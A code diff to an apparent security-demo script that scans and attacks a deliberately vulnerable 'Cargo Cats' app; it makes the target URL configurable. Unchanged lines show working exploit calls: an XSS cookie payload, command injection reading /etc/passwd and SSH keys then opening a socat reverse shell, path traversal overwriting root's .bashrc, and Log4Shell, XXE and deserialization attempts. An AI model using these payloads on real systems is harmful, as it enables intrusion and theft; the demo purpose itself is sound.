@@ -14,7 +14,7 @@ import base64
 import re
 from typing import Dict, Optional
 from kubernetes import client, config
-
+import urllib.parse
 
 
 ########################################
@@ -128,7 +128,9 @@ if contrast_api_authorization:
 else:
     logger.warning("Contrast API authorization not found in environment")
 
-zap_url = "http://zapproxy:80"
+zap_url = "http://zapproxy:8080"
+cargo_cats_url = "{{ .Values.consoleui.vulnAppUrl }}"
+base_cargo_cats_url_encoded = urllib.parse.quote(f"{cargo_cats_url}/")
 first_run = True
 scan_running = False
 stop_scan_flag = False
@@ -1113,9 +1115,9 @@ def scan():
     scan_state = "spider"
     log_scan_output("Starting spiders")
     #spider index
-    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url=http%3A%2F%2Fcargocats.localhost%2F&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
+    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url={base_cargo_cats_url_encoded}%2F&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
     #spider dashboard
-    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url=http%3A%2F%2Fcargocats.localhost%2Fdashboard&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
+    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url={base_cargo_cats_url_encoded}%2Fdashboard&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
 
     spiders_done = False
     while not spiders_done and not stop_scan_flag:
@@ -1136,7 +1138,7 @@ def scan():
     #ajax spider default context as admin
     scan_state = "ajax_spider"
     log_scan_output("Starting ajax spider as admin")
-    r = requests.get(f"{zap_url}/JSON/ajaxSpider/action/scanAsUser/?contextName=Default&userName=admin&url=http%3A%2F%2Fcargocats.localhost%2Fdashboard&subtreeOnly=", timeout=5)
+    r = requests.get(f"{zap_url}/JSON/ajaxSpider/action/scanAsUser/?contextName=Default&userName=admin&url={base_cargo_cats_url_encoded}%2Fdashboard&subtreeOnly=", timeout=5)
 
     spiders_done = False
     while not spiders_done and not stop_scan_flag:
@@ -1184,7 +1186,7 @@ def scan():
 def run_xss_exploit(session):
     """Execute XSS exploit"""
     log_exploit_output("Executing XSS exploit")
-    r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", timeout=5)
+    r = session.get(f"{cargo_cats_url}/api/shipments/track?trackingId=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", timeout=5)
     log_exploit_output(f"XSS exploit response status: {r.status_code}")
     return r.status_code == 200
 
@@ -1192,7 +1194,7 @@ def run_login_exploit(session):
     """Execute login with default credentials"""
     log_exploit_output("Attempting login with default credentials")
     creds = {"username": "admin","password": "password123"}
-    r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
+    r = session.post(f"{cargo_cats_url}/login", data=creds, timeout=10, allow_redirects=True)
     log_exploit_output(f"Login response status: {r.status_code}")
     return r.status_code == 200
 
@@ -1202,12 +1204,12 @@ def run_command_injection_exploit(session):
     
     # Basic command injection - /etc/passwd
     body = {"url":"google.com; cat /etc/passwd"}
-    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
+    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5)
     log_exploit_output(f"Command injection (cat /etc/passwd) response status: {r.status_code}")
 
     # Command injection - authorized_keys
     body = {"url":"google.com; cat ~/.ssh/authorized_keys"}
-    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
+    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5)
     log_exploit_output(f"Command injection (cat authorized_keys) response status: {r.status_code}")
     
     # Reverse shell preparation and execution
@@ -1215,17 +1217,17 @@ def run_command_injection_exploit(session):
     
     # APT Update
     body = {"url":"google.com; apt update"}
-    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=20)
+    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=20)
     log_exploit_output(f"APT update response status: {r.status_code}")
 
     # Socat Installation
     body = {"url":"google.com; apt install -y socat"}
-    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=30)
+    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=30)
     log_exploit_output(f"Socat installation response status: {r.status_code}")
 
     # Reverse Shell
     body = {"url":"google.com; socat 192.168.1.1:4444 exec:/bin/bash"}
-    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
+    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5)
     log_exploit_output(f"Reverse shell attempt response status: {r.status_code}")
     
     return r.status_code == 200
@@ -1235,11 +1237,11 @@ def run_path_traversal_exploit(session):
     log_exploit_output("Executing path traversal exploit")
     
     # Attempt to read appsettings.json via path traversal
-    r = session.get("http://cargocats.localhost/api/photos/view?path=../appsettings.json", timeout=5)
+    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../appsettings.json", timeout=5)
     log_exploit_output(f"Path traversal exploit (../appsettings.json) response status: {r.status_code}")
     
     # Attempt to read root's bashrc
-    r = session.get("http://cargocats.localhost/api/photos/view?path=../../root/.bashrc", timeout=5)
+    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../../root/.bashrc", timeout=5)
     log_exploit_output(f"Path traversal exploit (../../root/.bashrc) response status: {r.status_code}")
     
     # Save bashrc content and modify it for command exfiltration
@@ -1263,7 +1265,7 @@ def run_path_traversal_exploit(session):
             
             log_exploit_output(f"Attempting to write {len(malicious_bashrc)} bytes to {malicious_filename}")
             try:
-                r_write = session.post("http://cargocats.localhost/api/photos/upload", files=files, timeout=10, allow_redirects=False)
+                r_write = session.post(f"{cargo_cats_url}/api/photos/upload", files=files, timeout=10, allow_redirects=False)
                 log_exploit_output(f"Path traversal write exploit (modified bashrc) response status: {r_write.status_code}")
                 
                 # Log response body for debugging
@@ -1280,7 +1282,7 @@ def run_path_traversal_exploit(session):
             
             # Test if the file was actually written by trying to read it back
             log_exploit_output("Verifying bashrc write by reading it back...")
-            r_verify = session.get("http://cargocats.localhost/api/photos/view?path=../../root/.bashrc", timeout=5)
+            r_verify = session.get(f"{cargo_cats_url}/api/photos/view?path=../../root/.bashrc", timeout=5)
             log_exploit_output(f"Bashrc verification read response status: {r_verify.status_code}")
             
             if r_verify.status_code == 200:
@@ -1308,7 +1310,7 @@ def run_sql_injection_exploit(session):
     
     import time
     start_time = time.time()
-    r = session.post("http://cargocats.localhost/api/payments/process", 
+    r = session.post(f"{cargo_cats_url}/api/payments/process", 
                     json=sql_injection_payload, 
                     timeout=15)
     end_time = time.time()
@@ -1334,7 +1336,7 @@ def run_log4shell_exploit(session):
         "password": "dgsdfdfsg"
     }
     
-    r = session.post("http://cargocats.localhost/login", 
+    r = session.post(f"{cargo_cats_url}/login", 
                     data=log4shell_payload, 
                     timeout=15)
     log_exploit_output(f"Log4Shell exploit response status: {r.status_code}")
@@ -1342,7 +1344,7 @@ def run_log4shell_exploit(session):
     # Re-authenticate after Log4Shell exploit
     log_exploit_output("Re-authenticating after Log4Shell exploit")
     creds = {"username": "admin","password": "password123"}
-    r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
+    r = session.post(f"{cargo_cats_url}/login", data=creds, timeout=10, allow_redirects=True)
     log_exploit_output(f"Re-login response status: {r.status_code}")
     
     return r.status_code == 200
@@ -1359,7 +1361,7 @@ def run_ssjs_injection_exploit(session):
         "trackingId": "TRACK-12345678"
     }
     
-    r = session.post("http://cargocats.localhost/api/labels/generate", 
+    r = session.post(f"{cargo_cats_url}/api/labels/generate", 
                     json=ssjs_payload, 
                     timeout=10)
     log_exploit_output(f"SSJS injection exploit response status: {r.status_code}")
@@ -1393,7 +1395,7 @@ def run_xxe_exploit(session):
     
     # Upload malicious DOCX file
     files = {'file': ('xxe_payload.docx', xxe_docx_data, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
-    r = session.post("http://cargocats.localhost/api/documents/process", files=files, timeout=10, allow_redirects=False)
+    r = session.post(f"{cargo_cats_url}/api/documents/process", files=files, timeout=10, allow_redirects=False)
     log_exploit_output(f"XXE exploit response status: {r.status_code}")
     
     # Check if XXE was successful by looking for passwd file content in response
@@ -1425,7 +1427,7 @@ def run_deserialization_exploit(session):
         
         # Upload the malicious serialized payload file
         files = {'file': ('payload.ser', payload_data, 'application/octet-stream')}
-        r = session.post("http://cargocats.localhost/api/addresses/import", files=files, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/addresses/import", files=files, timeout=10, allow_redirects=False)
         log_exploit_output(f"Deserialization exploit response status: {r.status_code}")
         log_exploit_output(f"Deserialization exploit response body: {r.text[:500] if r.text else 'Empty'}")
         
@@ -1525,7 +1527,7 @@ def exploit():
         
         log_exploit_output("Additional login verification after Log4Shell exploit")
         creds = {"username": "admin","password": "password123"}
-        r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
+        r = session.post(f"{cargo_cats_url}/login", data=creds, timeout=10, allow_redirects=True)
         log_exploit_output(f"Post-Log4Shell login response status: {r.status_code}")
 
         # ================================================
@@ -1588,11 +1590,11 @@ def traffic():
         log_traffic_output("Phase 1: Initial page browsing")
         
         # Visit home page
-        r = session.get("http://cargocats.localhost/", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited home page - Status: {r.status_code}")
         
         # Test shipment tracking with wrong ID
-        r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=wrong", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/shipments/track?trackingId=wrong", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipment tracking (wrong ID) - Status: {r.status_code}")
         
         # ================================================
@@ -1602,21 +1604,21 @@ def traffic():
         log_traffic_output("Phase 2: Login attempts")
         
         # Visit login page
-        r = session.get("http://cargocats.localhost/login", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/login", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited login page - Status: {r.status_code}")
         
         # Failed login attempt
         failed_creds = {"username": "wrong", "password": "wrong"}
-        r = session.post("http://cargocats.localhost/login", data=failed_creds, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/login", data=failed_creds, timeout=10, allow_redirects=False)
         log_traffic_output(f"Failed login attempt - Status: {r.status_code}")
         
         # Visit login error page
-        r = session.get("http://cargocats.localhost/login?error=true", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/login?error=true", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited login error page - Status: {r.status_code}")
         
         # Successful login
         success_creds = {"username": "admin", "password": "password123"}
-        r = session.post("http://cargocats.localhost/login", data=success_creds, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/login", data=success_creds, timeout=10, allow_redirects=False)
         log_traffic_output(f"Successful login attempt - Status: {r.status_code}")
         
         # ================================================
@@ -1626,15 +1628,15 @@ def traffic():
         log_traffic_output("Phase 3: Dashboard navigation")
         
         # Visit dashboard
-        r = session.get("http://cargocats.localhost/dashboard", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/dashboard", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited dashboard - Status: {r.status_code}")
         
         # Dashboard shipment tracking with valid ID
-        r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=TRACK-48460B74", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/shipments/track?trackingId=TRACK-48460B74", timeout=5, allow_redirects=False)
         log_traffic_output(f"Dashboard shipment tracking - Status: {r.status_code}")
         
         # Get cat facts for dashboard
-        r = session.get("http://cargocats.localhost/api/cats/facts", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/cats/facts", timeout=5, allow_redirects=False)
         log_traffic_output(f"Cat facts API call - Status: {r.status_code}")
         
         # ================================================
@@ -1644,15 +1646,15 @@ def traffic():
         log_traffic_output("Phase 4: Cats section navigation")
         
         # Visit cats page
-        r = session.get("http://cargocats.localhost/cats", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/cats", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited cats page - Status: {r.status_code}")
         
         # Cats API call
-        r = session.get("http://cargocats.localhost/api/cats", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/cats", timeout=5, allow_redirects=False)
         log_traffic_output(f"Cats API call - Status: {r.status_code}")
         
         # Cat facts API call
-        r = session.get("http://cargocats.localhost/api/cats/facts", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/cats/facts", timeout=5, allow_redirects=False)
         log_traffic_output(f"Cat facts API call (cats section) - Status: {r.status_code}")
         
         # Test viewing existing cat images if any cats have images
@@ -1667,7 +1669,7 @@ def traffic():
                         image_url = cat['image']
                         # Extract full URL from relative path if needed
                         if image_url.startswith('/api/photos/view'):
-                            full_image_url = f"http://cargocats.localhost{image_url}"
+                            full_image_url = f"{cargo_cats_url}{image_url}"
                         else:
                             full_image_url = image_url
                         
@@ -1683,7 +1685,7 @@ def traffic():
             log_traffic_output(f"Using cat.jpg for image upload, size: {len(cat_image_data)} bytes")
         
         files = {'file': ('cat.jpg', cat_image_data, 'image/jpeg')}
-        r = session.post("http://cargocats.localhost/api/photos/upload", files=files, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/photos/upload", files=files, timeout=10, allow_redirects=False)
         log_traffic_output(f"Cat.jpg image upload - Status: {r.status_code}")
         
         # Parse the upload response to get the image path
@@ -1698,21 +1700,21 @@ def traffic():
         
         # Test image view endpoint if upload was successful
         if uploaded_image_path:
-            r = session.get(f"http://cargocats.localhost/api/photos/view?path={uploaded_image_path}", timeout=5, allow_redirects=False)
+            r = session.get(f"{cargo_cats_url}/api/photos/view?path={uploaded_image_path}", timeout=5, allow_redirects=False)
             log_traffic_output(f"Image view test - Status: {r.status_code}")
         
         # Test error cases for image endpoints
         # Test viewing non-existent image
-        r = session.get("http://cargocats.localhost/api/photos/view?path=nonexistent/image.jpg", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/photos/view?path=nonexistent/image.jpg", timeout=5, allow_redirects=False)
         log_traffic_output(f"Non-existent image view test - Status: {r.status_code}")
         
         # Test upload without file parameter
-        r = session.post("http://cargocats.localhost/api/photos/upload", data={}, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/photos/upload", data={}, timeout=5, allow_redirects=False)
         log_traffic_output(f"Image upload without file test - Status: {r.status_code}")
         
         # Test upload with invalid file type (text file)
         invalid_files = {'file': ('test.txt', b'This is not an image', 'text/plain')}
-        r = session.post("http://cargocats.localhost/api/photos/upload", files=invalid_files, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/photos/upload", files=invalid_files, timeout=5, allow_redirects=False)
         log_traffic_output(f"Invalid file upload test - Status: {r.status_code}")
         
         # Add new cat with image
@@ -1721,17 +1723,17 @@ def traffic():
             "type": "Persian", 
             "image": f"/api/photos/view?path={uploaded_image_path}" if uploaded_image_path else None
         }
-        r = session.post("http://cargocats.localhost/api/cats", json=cat_data_with_image, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/cats", json=cat_data_with_image, timeout=5, allow_redirects=False)
         log_traffic_output(f"Cats API POST new cat with image - Status: {r.status_code}")
         
         # Add new cat without image (original test)
         cat_data = {"name": "muppet_no_image", "type": "Persian", "image": None}
-        r = session.post("http://cargocats.localhost/api/cats", json=cat_data, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/cats", json=cat_data, timeout=5, allow_redirects=False)
         log_traffic_output(f"Cats API POST new cat without image - Status: {r.status_code}")
         
         # Test DELETE cat endpoint using a separate session (not logged in)
         delete_session = requests.Session()
-        r = delete_session.delete("http://cargocats.localhost/api/cats/2", timeout=5, allow_redirects=False)
+        r = delete_session.delete(f"{cargo_cats_url}/api/cats/2", timeout=5, allow_redirects=False)
         log_traffic_output(f"Cats API DELETE cat (id=1, no auth) - Status: {r.status_code}")
         
         # Test document processing service
@@ -1758,16 +1760,16 @@ def traffic():
         
         # Upload DOCX file to document processing service
         files = {'file': ('medical_history.docx', docx_data, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
-        r = session.post("http://cargocats.localhost/api/documents/process", files=files, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/documents/process", files=files, timeout=10, allow_redirects=False)
         log_traffic_output(f"Document processing API POST - Status: {r.status_code}")
         
         # Test document service health check
-        r = session.get("http://cargocats.localhost/api/documents/health", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/documents/health", timeout=5, allow_redirects=False)
         log_traffic_output(f"Document service health check - Status: {r.status_code}")
         
         # Test document processing with invalid file (should fail)
         invalid_files = {'file': ('not_a_docx.txt', b'This is not a DOCX file', 'text/plain')}
-        r = session.post("http://cargocats.localhost/api/documents/process", files=invalid_files, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/documents/process", files=invalid_files, timeout=5, allow_redirects=False)
         log_traffic_output(f"Document processing invalid file test - Status: {r.status_code}")
         
         # ================================================
@@ -1777,16 +1779,16 @@ def traffic():
         log_traffic_output("Phase 5: Addresses section navigation")
         
         # Visit addresses page
-        r = session.get("http://cargocats.localhost/addresses", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/addresses", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited addresses page - Status: {r.status_code}")
         
         # Addresses API call
-        r = session.get("http://cargocats.localhost/api/addresses", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/addresses", timeout=5, allow_redirects=False)
         log_traffic_output(f"Addresses API call - Status: {r.status_code}")
         
         # Add new address
         address_data = {"fname": "tyler", "name": "tester", "address": "123 main street usa"}
-        r = session.post("http://cargocats.localhost/api/addresses", json=address_data, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/addresses", json=address_data, timeout=5, allow_redirects=False)
         log_traffic_output(f"Addresses API POST new address - Status: {r.status_code}")
         
         # ================================================
@@ -1796,11 +1798,11 @@ def traffic():
         log_traffic_output("Phase 6: Webhooks section navigation")
         
         # Visit webhooks page
-        r = session.get("http://cargocats.localhost/webhooks", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/webhooks", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited webhooks page - Status: {r.status_code}")
         
         # Webhooks API interactions
-        r = session.get("http://cargocats.localhost/api/shipments", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/shipments", timeout=5, allow_redirects=False)
         log_traffic_output(f"Webhook API GET /api/shipments - Status: {r.status_code}")
         
         test_notification_body = {
@@ -1812,15 +1814,15 @@ def traffic():
                 "id": 1
             }
         }
-        r = session.post("http://cargocats.localhost/api/webhook/test-shipment-notification", json=test_notification_body, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/webhook/test-shipment-notification", json=test_notification_body, timeout=5, allow_redirects=False)
         log_traffic_output(f"Webhook API POST test-shipment-notification - Status: {r.status_code}")
         
         webhook_body = {"notificationUrl": "https://contrastsecurity.com", "webhookMethod": "GET"}
-        r = session.patch("http://cargocats.localhost/api/shipments/1/webhook", json=webhook_body, timeout=5, allow_redirects=False)
+        r = session.patch(f"{cargo_cats_url}/api/shipments/1/webhook", json=webhook_body, timeout=5, allow_redirects=False)
         log_traffic_output(f"Webhook API PATCH shipments/1/webhook - Status: {r.status_code}")
         
         body = {"url": "contrastsecurity.com"}
-        r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5, allow_redirects=False)
         log_traffic_output(f"Webhook API POST test-connection - Status: {r.status_code}")
 
         # ================================================
@@ -1831,7 +1833,7 @@ def traffic():
 
         # Export addresses (GET)
         try:
-            r = session.get("http://cargocats.localhost/api/addresses/export", timeout=10, allow_redirects=False)
+            r = session.get(f"{cargo_cats_url}/api/addresses/export", timeout=10, allow_redirects=False)
             log_traffic_output(f"Addresses export (GET /api/addresses/export) - Status: {r.status_code}")
             if r.status_code == 200:
                 log_traffic_output(f"Exported addresses file size: {len(r.content)} bytes")
@@ -1842,7 +1844,7 @@ def traffic():
         try:
             with open("addresses.ser", "rb") as f:
                 files = {'file': ('addresses.ser', f, 'application/octet-stream')}
-                r = session.post("http://cargocats.localhost/api/addresses/import", files=files, timeout=10, allow_redirects=False)
+                r = session.post(f"{cargo_cats_url}/api/addresses/import", files=files, timeout=10, allow_redirects=False)
                 log_traffic_output(f"Addresses import (POST /api/addresses/import) - Status: {r.status_code}")
                 if r.status_code == 200:
                     log_traffic_output("Addresses import succeeded")
@@ -1858,22 +1860,22 @@ def traffic():
         log_traffic_output("Phase 8: Shipments section navigation")
         
         # Visit shipments page
-        r = session.get("http://cargocats.localhost/shipments", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/shipments", timeout=5, allow_redirects=False)
         log_traffic_output(f"Visited shipments page - Status: {r.status_code}")
         
         # Shipments API calls
-        r = session.get("http://cargocats.localhost/api/addresses", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/addresses", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/addresses - Status: {r.status_code}")
         
-        r = session.get("http://cargocats.localhost/api/cats", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/cats", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/cats - Status: {r.status_code}")
         
-        r = session.get("http://cargocats.localhost/api/shipments", timeout=5, allow_redirects=False)
+        r = session.get(f"{cargo_cats_url}/api/shipments", timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API /api/shipments - Status: {r.status_code}")
         
         # Process payment for shipment
         payment_data = {"shipmentId": "1", "cardNumber": "1111111111111111"}
-        r = session.post("http://cargocats.localhost/api/payments/process", json=payment_data, timeout=5, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/payments/process", json=payment_data, timeout=5, allow_redirects=False)
         log_traffic_output(f"Shipments API POST payment processing - Status: {r.status_code}")
         
         # ================================================
@@ -1889,7 +1891,7 @@ def traffic():
             "address": "123 Main Street, Anytown, USA 12345",
             "trackingId": "TRACK-48460B74"
         }
-        r = session.post("http://cargocats.localhost/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
+        r = session.post(f"{cargo_cats_url}/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
         log_traffic_output(f"Label generation API POST - Status: {r.status_code}")
         
         traffic_state = "finished"
